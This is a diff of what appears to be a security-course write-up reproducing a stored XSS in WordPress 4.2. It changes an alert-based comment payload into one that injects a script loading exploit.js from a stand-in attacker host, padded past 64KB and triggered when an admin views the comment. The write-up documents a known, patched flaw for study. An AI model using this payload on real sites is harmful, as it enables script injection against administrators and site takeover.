@@ -14,11 +14,11 @@ Started:  3:10pm 4/10/18
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: REFER TO FirstExploit
   - [ ] Steps to recreate:
-  I went to a location where I could leave a comment then pasted <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+  I went to a location where I could leave a comment then pasted <a title='xxx onmouseover=eval(unescape(/var%20a%3Ddocument.createElement%28%27script%27%29%3Ba.setAttribute%28%27src%27%2C%27https%3A%2f%2fattacker.site%2fexploit.js%27%29%3Bdocument.head.appendChild%28a%29/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
 and I went to http://bytesizematters.com/ and typed out more than 64KB of the character "A", Then I copied it and pasted it 
-into the Comment box afterwards I posted the comment.
+into the Comment box afterwards I posted the comment. Sign into admin and viewed Network tab under developer tools for exploit
   - [ ] Affected source code:
     - [Link 1](https://klikki.fi/adv/wordpress2.html)
 
